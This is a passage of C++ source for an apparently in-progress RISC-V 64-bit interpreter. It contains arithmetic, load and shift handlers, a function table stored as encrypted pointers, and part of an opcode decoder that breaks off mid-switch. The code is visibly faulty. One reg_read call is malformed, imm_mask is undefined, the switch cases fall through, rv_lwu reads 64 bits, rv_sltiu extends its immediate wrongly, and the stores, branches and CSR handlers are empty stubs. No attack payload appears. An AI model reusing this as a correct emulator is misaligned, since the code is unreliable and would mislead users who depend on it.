    uintptr_t v1 = 0, v2 = 0;

    reg_read(uintptr_t rs1, v1);
    reg_read(uintptr_t rs2, v2);

    if (v2 == 0) {
        reg_write(uintptr_t, rd, 0);
                  } else {
                  reg_write(uintptr_t, rd, (v1 / v2));
    }
}

__function void rv_or(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    intptr_t v1 = 0, v2 = 0;

    reg_read(intptr_t, rs1, v1);
    reg_read(intptr_t, rs2, v2);
    reg_write(intptr_t, rd, (v1 | v2));
}

__function void rv_rem(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    intptr_t v1 = 0, v2 = 0;

    reg_read(intptr_t, rs1, v1);
    reg_read(intptr_t, rs2, v2);

    if (v2 == 0) {
        reg_write(intptr_t, rd, 0);
                  } else {
                  reg_write(intptr_t, rd, (v1 % v2));
    }
}

__function void rv_and(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t v1 = 0, v2 = 0;

    reg_read(uintptr_t, rs1, v1);
    reg_read(uintptr_t, rs2, v2);
    reg_write(uintptr_t, rd, (v1 & v2));
}

__function void rv_remu(uint8_t rs2, uint8_t rs1, uint8_t rd) {
    uintptr_t v1 = 0, v2 = 0;

    reg_read(uintptr_t, rs1, v1);
    reg_read(uintptr_t, rs2, v2);

    if (v2 == 0) {
        reg_write(uintptr_t, rd, 0);
                  } else {
                  reg_write(uintptr_t, rd, (v1 % v2));
    }
}

__function void rv_addi(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    intptr_t v1 = 0;
    intptr_t imm = (intptr_t)(int16_t)imm_11_0;

    reg_read(intptr_t, rs1, v1);
    reg_write(intptr_t, rd, (v1 + imm));
}

__function void rv_slti(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    intptr_t v1 = 0;
    intptr_t imm = (intptr_t)(int16_t)imm_11_0;

    reg_read(intptr_t, rs1, v1);
    reg_write(intptr_t, rd, ((v1 < imm) ? 1 : 0));
}

__function void rv_sltiu(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    uintptr_t v1 = 0;
    uintptr_t imm = (uintptr_t)(uint16_t)imm_11_0;

    reg_read(uintptr_t, rs1, v1);
    reg_write(uintptr_t, rd, ((v1 < imm) ? 1 : 0));
}

__function void rv_xori(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    intptr_t v1 = 0;
    intptr_t imm = (intptr_t)(int16_t)imm_11_0;

    reg_read(intptr_t, rs1, v1);
    reg_write(intptr_t, rd, (v1 ^ imm));
}

__function void rv_ori(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    intptr_t v1 = 0;
    intptr_t imm = (intptr_t)(int16_t)imm_11_0;

    reg_read(intptr_t, rs1, v1);
    reg_write(intptr_t, rd, (v1 | imm));
}

__function void rv_andi(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    intptr_t v1 = 0;
    intptr_t imm = (intptr_t)(int16_t)imm_11_0;

    reg_read(intptr_t, rs1, v1);
    reg_write(intptr_t, rd, (v1 & imm));
}

__function void rv_slli(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    intptr_t v1 = 0;
    intptr_t shamt = imm_11_0 & 0x1F;

    reg_read(intptr_t, rs1, v1);
    reg_write(intptr_t, rd, (v1 << shamt));
}

__function void rv_srli(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    intptr_t v1 = 0;
    uint8_t shamt = imm_11_0 & 0x1F;

    reg_read(intptr_t, rs1, v1);
    reg_write(uintptr_t, rd, v1 >> shamt);
}

__function void rv_srai(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    intptr_t v1 = 0;
    uint8_t imm = imm_11_0 & 0x1F;

    reg_read(intptr_t, rs1, v1);
    reg_write(intptr_t, rd, (v1 >> imm));
}

__function void rv_addiw(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0;
    int32_t imm = (int32_t)(int16_t)imm_11_0;

    reg_read(int32_t, rs1, v1);
    reg_write(int32_t, rd, v1 + imm);
}

__function void rv_slliw(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0;
    int32_t shamt = imm_11_0 & 0x1F;

    reg_read(int32_t, rs1, v1);

    if ((imm_11_0 >> 5) != 0) {
        m_halt = 1;
        m_reason = vm_reason::illegal_op;
        return;
    }

    reg_write(int32_t, rd, (v1 << shamt));
}

__function void rv_srliw(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0;
    int32_t shamt = imm_11_0 & 0x1F;

    reg_read(int32_t, rs1, v1);

    if ((imm_11_0 >> 5) != 0) {
        m_halt = 1;
        m_reason = vm_reason::illegal_op;
        return;
    }

    reg_write(int32_t, rd, (v1 >> shamt));
}

__function void rv_sraiw(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0;
    uint8_t shamt = imm_11_0 & 0x1F;

    reg_read(int32_t, rs1, v1);

    if ((imm_11_0 >> 5) != 0) {
        m_halt = 1;
        m_reason = vm_reason::illegal_op;
        return;
    }

    reg_write(int32_t, rd, (v1 >> shamt));
}

__function void rv_lb(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    int8_t v1 = 0;
    uintptr_t address = 0;

    reg_read(uintptr_t, rs1, address);
    address += (intptr_t)(int16_t)imm_11_0;

    mem_read(int8_t, address, v1);
    reg_write(int8_t, rd, v1);
}

__function void rv_lh(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    int16_t v1 = 0;
    uintptr_t address = 0;

    reg_read(uintptr_t, rs1, address);
    address += (intptr_t)(int16_t)imm_11_0;

    mem_read(int16_t, address, v1);
    reg_write(intptr_t, rd, v1);
}

__function void rv_lw(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    int32_t v1 = 0;
    uintptr_t address = 0;

    reg_read(uintptr_t, rs1, address);
    address += (intptr_t)(int16_t)imm_11_0;

    mem_read(int32_t, address, v1);
    reg_write(intptr_t, rd, v1);
}

__function void rv_lbu(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    uint8_t v1 = 0;
    uintptr_t address = 0;

    reg_read(uintptr_t, rs1, address);
    address += (intptr_t)(int16_t)imm_11_0;

    mem_read(uint8_t, address, v1);
    reg_write(uintptr_t, rd, v1);
}

__function void rv_lhu(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    uint16_t v1 = 0;
    uintptr_t address = 0;

    reg_read(uintptr_t, rs1, address);
    address += (intptr_t)(int16_t)imm_11_0;

    mem_read(uint16_t, address, v1);
    reg_write(uintptr_t, rd, v1);
}

__function void rv_lwu(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    uint64_t v1 = 0;
    uintptr_t address = 0;

    reg_read(uintptr_t, rs1, address);
    address += (intptr_t)(int16_t)imm_11_0;

    mem_read(uint64_t, address, v1);
    reg_write(uint64_t, rd, v1);
}

__function void rv_ld(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    int64_t v1 = 0;
    uintptr_t address = 0;

    reg_read(uintptr_t, rs1, address);
    address += (intptr_t)(int16_t)imm_11_0;

    mem_read(int64_t, address, v1);
    reg_write(int64_t, rd, v1);
}

__function void rv_flq(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) { }
__function void rv_fence(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) { }
__function void rv_fence_i(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) { }

__function void rv_jalr(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    uintptr_t address = 0;

    reg_read(uintptr_t, rs1, address);
    address += (intptr_t)(int16_t)imm_11_0;
    address &= ~1;

    uintptr_t ret = ip_read();
    ret += 4;

    reg_write(uintptr_t, rd, ret);
    set_branch(address);
}

__function void rv_ecall(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    /*
                   Description
                   Make a request to the supporting execution environment.
                   When executed in U-mode, S-mode, or M-mode, it generates an environment-call-from-U-mode exception,
                   environment-call-from-S-mode exception, or environment-call-from-M-mode exception, respectively, and performs no other operation.

                   Implementation
                   RaiseException(EnvironmentCall)

                   - CHECK SEDELEG
                   - SAVE PC IN SEPC/MEPC
                   - RAISE PRIVILEGE TO S/M
                   - JUMP TO STVEC/MTVEC
                   - KERNEL/SBI HANDLER
                   - RETURN TO SEPC/MEPC

                   Save register and program state
                   */
}

__function void rv_ebreak(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    /*
                   Description
                   Used by debuggers to cause control to be transferred back to a debugging environment.
                   It generates a breakpoint exception and performs no other operation.

                   Implementation
                   RaiseException(Breakpoint)
                   */
    UNUSED_PARAMETER(imm_11_0);
    UNUSED_PARAMETER(rs1);
    UNUSED_PARAMETER(rd);
    __debugbreak();
}

__function void rv_csrrw(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    /*
                   Description
                   Atomically swaps values in the CSRs and integer registers.
                   CSRRW reads the old value of the CSR, zero-extends the value to XLEN bits, then writes it to integer register rd.
                   The initial value in rs1 is written to the CSR.
                   If rd=x0, then the instruction shall not read the CSR and shall not cause any of the side effects that might occur on a CSR read.

                   Implementation
                   t = CSRs[csr]; CSRs[csr] = x[rs1]; x[rd] = t
                   */
}

__function void rv_csrrs(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    /*
                   Description
                   Reads the value of the CSR, zero-extends the value to XLEN bits, and writes it to integer register rd.
                   The initial value in integer register rs1 is treated as a bit mask that specifies bit positions to be set in the CSR.
                   Any bit that is high in rs1 will cause the corresponding bit to be set in the CSR, if that CSR bit is writable.
                   Other bits in the CSR are unaffected (though CSRs might have side effects when written).

                   Implementation
                   t = CSRs[csr]; CSRs[csr] = t | x[rs1]; x[rd] = t
                   */
}

__function void rv_csrrc(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    /*
                   Description
                   Reads the value of the CSR, zero-extends the value to XLEN bits, and writes it to integer register rd.
                   The initial value in integer register rs1 is treated as a bit mask that specifies bit positions to be cleared in the CSR.
                   Any bit that is high in rs1 will cause the corresponding bit to be cleared in the CSR, if that CSR bit is writable.
                   Other bits in the CSR are unaffected.

                   Implementation
                   t = CSRs[csr]; CSRs[csr] = t &~x[rs1]; x[rd] = t
                   */
}

__function void rv_csrrwi(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    /*
                   Description
                   Update the CSR using an XLEN-bit value obtained by zero-extending a 5-bit unsigned immediate (uimm[4:0]) field encoded in the rs1 field.

                   Implementation
                   x[rd] = CSRs[csr]; CSRs[csr] = zimm
                   */
}

__function void rv_csrrsi(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    /*
                   Description
                   Set CSR bit using an XLEN-bit value obtained by zero-extending a 5-bit unsigned immediate (uimm[4:0]) field encoded in the rs1 field.

                   Implementation
                   t = CSRs[csr]; CSRs[csr] = t | zimm; x[rd] = t
                   */
}

__function void rv_csrrci(uint16_t imm_11_0, uint8_t rs1, uint8_t rd) {
    /*
                   Description
                   Clear CSR bit using an XLEN-bit value obtained by zero-extending a 5-bit unsigned immediate (uimm[4:0]) field encoded in the rs1 field.

                   Implementation
                   t = CSRs[csr]; CSRs[csr] = t &~zimm; x[rd] = t
                   */
}

__function void rv_sb(uint8_t imm_11_5, uint8_t rs2, uint8_t rs1, uint8_t imm_4_0) {
    /*
                   Description
                   Store 8-bit, values from the low bits of register rs2 to memory.

                   Implementation
                   M[x[rs1] + sext(offset)] = x[rs2][7:0]
                   */
}

__function void rv_sh(uint8_t imm_11_5, uint8_t rs2, uint8_t rs1, uint8_t imm_4_0) {
    /*
                   Description
                   Store 16-bit, values from the low bits of register rs2 to memory.

                   Implementation
                   M[x[rs1] + sext(offset)] = x[rs2][15:0]
                   */
}

__function void rv_sw(uint8_t imm_11_5, uint8_t rs2, uint8_t rs1, uint8_t imm_4_0) {
    /*
                   Description
                   Store 32-bit, values from the low bits of register rs2 to memory.

                   Implementation
                   M[x[rs1] + sext(offset)] = x[rs2][31:0]
                   */
}

__function void rv_sd(uint8_t imm_11_5, uint8_t rs2, uint8_t rs1, uint8_t imm_4_0) {
    /*
                   Description
                   Store 64-bit, values from register rs2 to memory.

                   Implementation
                   M[x[rs1] + sext(offset)] = x[rs2][63:0]
                   */
}

__function void rv_fsw(uint8_t imm_11_5, uint8_t rs2, uint8_t rs1, uint8_t imm_4_0) {
    /*
                   [fsw]
                   Description
                   Store a single-precision value from floating-point register rs2 to memory.

                   Implementation
                   M[x[rs1] + sext(offset)] = f[rs2][31:0]
                   */
}

__function void rv_fsd(uint8_t imm_11_5, uint8_t rs2, uint8_t rs1, uint8_t imm_4_0) {
    /*
                   Description
                   Store a double-precision value from the floating-point registers to memory.

                   Implementation
                   M[x[rs1] + sext(offset)] = f[rs2][63:0]
                   */
}

__function void rv_beq(uint8_t imm_12_10_5, uint8_t rs2, uint8_t rs1, uint8_t imm_4_1_11) {
    /*
                   Description
                   Take the branch if registers rs1 and rs2 are equal.

                   Implementation
                   if (x[rs1] == x[rs2]) pc += sext(offset)
                   */
}

__function void rv_bne(uint8_t imm_12_10_5, uint8_t rs2, uint8_t rs1, uint8_t imm_4_1_11) {
    /*
                   Description
                   Take the branch if registers rs1 and rs2 are not equal.

                   Implementation
                   if (x[rs1] != x[rs2]) pc += sext(offset)
                   */
}

__function void rv_blt(uint8_t imm_12_10_5, uint8_t rs2, uint8_t rs1, uint8_t imm_4_1_11) {
    /*
                   Description
                   Take the branch if registers rs1 is less than rs2, using signed comparison.

                   Implementation
                   if (x[rs1] <s x[rs2]) pc += sext(offset)
                   */
}

__function void rv_bge(uint8_t imm_12_10_5, uint8_t rs2, uint8_t rs1, uint8_t imm_4_1_11) {
    /*
                   Description
                   Take the branch if registers rs1 is greater than or equal to rs2, using signed comparison.

                   Implementation
                   if (x[rs1] >=s x[rs2]) pc += sext(offset)
                   */
}

__function void rv_bltu(uint8_t imm_12_10_5, uint8_t rs2, uint8_t rs1, uint8_t imm_4_1_11) {
    /*
                   Description
                   Take the branch if registers rs1 is less than rs2, using unsigned comparison.

                   Implementation
                   if (x[rs1] <u x[rs2]) pc += sext(offset)
                   */
}

__function void rv_bgeu(uint8_t imm_12_10_5, uint8_t rs2, uint8_t rs1, uint8_t imm_4_1_11) {
    /*
                   Description
                   Take the branch if registers rs1 is greater than or equal to rs2, using unsigned comparison.

                   Implementation
                   if (x[rs1] >=u x[rs2]) pc += sext(offset)
                   */
}

__function void rv_lui(uint32_t imm_31_12, uint8_t rd) {
    /*
                   Description
                   Build 32-bit constants and uses the U-type format. LUI places the U-immediate value in the top 20 bits of the destination register rd,
                   filling in the lowest 12 bits with zeros.

                   Implementation
                   x[rd] = sext(immediate[31:12] << 12)
                   */
}

__function void rv_auipc(uint32_t imm_31_12, uint8_t rd) {
    /*
                   Description
                   Build pc-relative addresses and uses the U-type format. AUIPC forms a 32-bit offset from the 20-bit U-immediate,
                   filling in the lowest 12 bits with zeros, adds this offset to the pc, then places the result in register rd.

                   Implementation
                   x[rd] = pc + sext(immediate[31:12] << 12)
                   */
}

__function void rv_jal(uint32_t imm_20_10_1_11_19_12, uint8_t rd) {
    /*
                   Description
                   Jump to address and place return address in rd.

                   Implementation
                   x[rd] = pc+4; pc += sext(offset)
                   */
}

__rdata constexpr uintptr_t __handler[256] = {
    // ITYPE
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_addi),      encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_slti),
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_sltiu),     encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_xori),
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_ori),       encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_andi),
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_slli),      encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_srli),
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_srai),      encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_addiw),
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_slliw),     encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_srliw),
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_sraiw),     encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_lb),
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_lh),        encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_lw),

    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_lbu),       encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_lhu),
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_lwu),       encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_ld),
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_flq),       encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_fence),
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_fence_i),   encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_jalr),
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_ecall),     encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_ebreak),
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_csrrw),     encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_csrrs),
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_csrrc),     encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_csrrwi),
    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_csrrsi),    encrypt_ptr((uintptr_t)rvm64::operation::itype::rv_csrrci),

    // RTYPE
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fadd_d),    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fsub_d),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fmul_d),    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fdiv_d),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fsqrt_d),   encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fmv_d_x),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fcvt_s_d),  encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fcvt_s_q),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fcvt_d_s),  encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fcvt_d_q),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fcvt_w_d),  encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fcvt_wu_d),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fcvt_l_d),  encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fcvt_lu_d),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fcvt_d_w),  encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fcvt_d_wu),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fcvt_d_l),  encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fcvt_d_lu),

    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fsgnj_d),   encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fsgnjn_d),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fsgnjx_d),  encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fmin_d),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fmax_d),    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_feq_d),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_flt_d),     encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fle_d),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fclass_d),  encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_fmv_x_d),

    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_lrw),       encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_scw),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amoswap_w), encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amoadd_w),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amoxor_w),  encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amoand_w),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amoor_w),   encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amomin_w),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amomax_w),  encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amominu_w),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amomaxu_w),

    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_lrd),       encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_scd),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amoswap_d), encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amoadd_d),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amoxor_d),  encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amoand_d),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amoor_d),   encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amomin_d),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amomax_d),  encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amominu_d),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_amomaxu_d),

    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_addw),      encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_subw),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_mulw),      encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_srlw),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_sraw),      encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_divuw),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_sllw),      encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_divw),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_remw),      encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_remuw),

    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_add),       encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_sub),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_mul),       encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_sll),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_mulh),      encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_slt),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_mulhsu),    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_sltu),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_mulhu),     encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_xor),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_div),       encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_srl),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_sra),       encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_divu),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_or),        encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_rem),
    encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_and),       encrypt_ptr((uintptr_t)rvm64::operation::rtype::rv_remu),

    // STYPE
    encrypt_ptr((uintptr_t)rvm64::operation::stype::rv_sb),        encrypt_ptr((uintptr_t)rvm64::operation::stype::rv_sh),
    encrypt_ptr((uintptr_t)rvm64::operation::stype::rv_sw),        encrypt_ptr((uintptr_t)rvm64::operation::stype::rv_sd),
    encrypt_ptr((uintptr_t)rvm64::operation::stype::rv_fsw),       encrypt_ptr((uintptr_t)rvm64::operation::stype::rv_fsd),
    encrypt_ptr((uintptr_t)rvm64::operation::stype::rv_fsq),

    // BTYPE
    encrypt_ptr((uintptr_t)rvm64::operation::btype::rv_beq),       encrypt_ptr((uintptr_t)rvm64::operation::btype::rv_bne),
    encrypt_ptr((uintptr_t)rvm64::operation::btype::rv_blt),       encrypt_ptr((uintptr_t)rvm64::operation::btype::rv_bge),
    encrypt_ptr((uintptr_t)rvm64::operation::btype::rv_bltu),      encrypt_ptr((uintptr_t)rvm64::operation::btype::rv_bgeu),

    // UTYPE/JTYPE
    encrypt_ptr((uintptr_t)rvm64::operation::utype::rv_lui),       encrypt_ptr((uintptr_t)rvm64::operation::utype::rv_auipc),
    encrypt_ptr((uintptr_t)rvm64::operation::jtype::rv_jal)
};

__function uintptr_t vm_decode(uint32_t opcode) { 
    uint8_t rs2   = (opcode >> 20) & 0x1F;
    uint8_t func3 = (opcode >> 12) & 0x7;
    uint8_t func7 = (opcode >> 25) & 0x7F;
    uint8_t func5 = (func7 >> 2) & 0x1F;

    // TODO: imm_mask is not defined for itype: case func3(0b101)
    uint16_t imm_11_0 = (opcode >> 20) & 0xFFF;
    uint8_t decoded = 0;

    opcode &= 0b1111111; 
    for (int idx = 0; idx < ARRAY_LEN(encoding); idx++) {
        if (encoding[idx].mask == opcode) {
            decoded = encoding[idx].type;
            break;
        }
    }
    if (!decoded) {
        m_halt = 1;
        m_reason = vm_reason::illegal_op;
        return -1;
    }

    switch(decoded) { 
        // I_TYPE
        case typenum::itype: switch(opcode) {
            case 0b0010011: switch(func3) {
                case 0b000: return rvm64::operation::__handler[tblenum::_addi];
                case 0b010: return rvm64::operation::__handler[tblenum::_slti];
                case 0b011: return rvm64::operation::__handler[tblenum::_sltiu];
                case 0b100: return rvm64::operation::__handler[tblenum::_xori];
                case 0b110: return rvm64::operation::__handler[tblenum::_ori];
                case 0b111: return rvm64::operation::__handler[tblenum::_andi];
                case 0b001: return rvm64::operation::__handler[tblenum::_slli];
                case 0b101: switch(imm_mask) {
                    case 0b0000000: return rvm64::operation::__handler[tblenum::_srli]; 
                    case 0b0100000: return rvm64::operation::__handler[tblenum::_srai];
                }
            }
            case 0b0011011: switch(func3) {
                case 0b000: return rvm64::operation::__handler[tblenum::_addiw];
                case 0b001: return rvm64::operation::__handler[tblenum::_slliw];
                case 0b101: switch(func7) {
                    case 0b0000000: return rvm64::operation::__handler[tblenum::_srliw];
                    case 0b0100000: return rvm64::operation::__handler[tblenum::_sraiw];
                }
            }
            case 0b0000011: switch(func3) {
                case 0b000: return rvm64::operation::__handler[tblenum::_lb]; 
                case 0b001: return rvm64::operation::__handler[tblenum::_lh]; 
                case 0b010: return rvm64::operation::__handler[tblenum::_lw]; 
                case 0b100: return rvm64::operation::__handler[tblenum::_lbu]; 
                case 0b101: return rvm64::operation::__handler[tblenum::_lhu]; 
                case 0b110: return rvm64::operation::__handler[tblenum::_lwu];
                case 0b011: return rvm64::operation::__handler[tblenum::_ld];
            }
        } 

        // R_TYPE
        case typenum::rtype: switch(opcode) {
            case 0b1010011: switch(func7) {
                case 0b0000001: return rvm64::operation::__handler[tblenum::_fadd_d];
                case 0b0000101: return rvm64::operation::__handler[tblenum::_fsub_d];
                case 0b0001001: return rvm64::operation::__handler[tblenum::_fmul_d];
                case 0b0001101: return rvm64::operation::__handler[tblenum::_fdiv_d];
                case 0b0101101: return rvm64::operation::__handler[tblenum::_fsqrt_d];
                case 0b1111001: return rvm64::operation::__handler[tblenum::_fmv_d_x];
                case 0b0100000: switch(rs2) {
                    case 0b00001: return rvm64::operation::__handler[tblenum::_fcvt_s_d]; 
                    case 0b00011: return rvm64::operation::__handler[tblenum::_fcvt_s_q];
                }
                case 0b0100001: switch(rs2) {
                    case 0b00000: return rvm64::operation::__handler[tblenum::_fcvt_d_s]; 
                    case 0b00011: return rvm64::operation::__handler[tblenum::_fcvt_d_q];
                }
                case 0b1100001: switch(rs2) {
                    case 0b00000: return rvm64::operation::__handler[tblenum::_fcvt_w_d]; 
                    case 0b00001: return rvm64::operation::__handler[tblenum::_fcvt_wu_d];
                    case 0b00010: return rvm64::operation::__handler[tblenum::_fcvt_l_d];
                    case 0b00011: return rvm64::operation::__handler[tblenum::_fcvt_lu_d];
                }
                case 0b1101001: switch(rs2) {
                    case 0b00000: return rvm64::operation::__handler[tblenum::_fcvt_d_w]; 
                    case 0b00001: return rvm64::operation::__handler[tblenum::_fcvt_d_wu];
                    case 0b00010: return rvm64::operation::__handler[tblenum::_fcvt_d_l];
                    case 0b00011: return rvm64::operation::__handler[tblenum::_fcvt_d_lu];
                }
                case 0b0010001: switch(func3) {
                    case 0b000: return rvm64::operation::__handler[tblenum::_fsgnj_d];
                    case 0b001: return rvm64::operation::__handler[tblenum::_fsgnjn_d];
                    case 0b010: return rvm64::operation::__handler[tblenum::_fsgnjx_d];
                }
                case 0b0010101: switch(func3) {
                    case 0b000: return rvm64::operation::__handler[tblenum::_fmin_d];
                    case 0b001: return rvm64::operation::__handler[tblenum::_fmax_d];
                }
                case 0b1010001: switch(func3) {
                    case 0b010: return rvm64::operation::__handler[tblenum::_feq_d];
                    case 0b001: return rvm64::operation::__handler[tblenum::_flt_d];
                    case 0b000: return rvm64::operation::__handler[tblenum::_fle_d];
                }
                case 0b1110001: switch(func3) {
                    case 0b001: return rvm64::operation::__handler[tblenum::_fclass_d];
                    case 0b000: return rvm64::operation::__handler[tblenum::_fmv_x_d];
                }
            }
            case 0b0101111: switch(func3) {
                case 0b010: switch(func5) {
                    case 0b00010: return rvm64::operation::__handler[tblenum::_lrw];
                    case 0b00011: return rvm64::operation::__handler[tblenum::_scw];
                    case 0b00001: return rvm64::operation::__handler[tblenum::_amoswap_w];
                    case 0b00000: return rvm64::operation::__handler[tblenum::_amoadd_w];
                    case 0b00100: return rvm64::operation::__handler[tblenum::_amoxor_w];
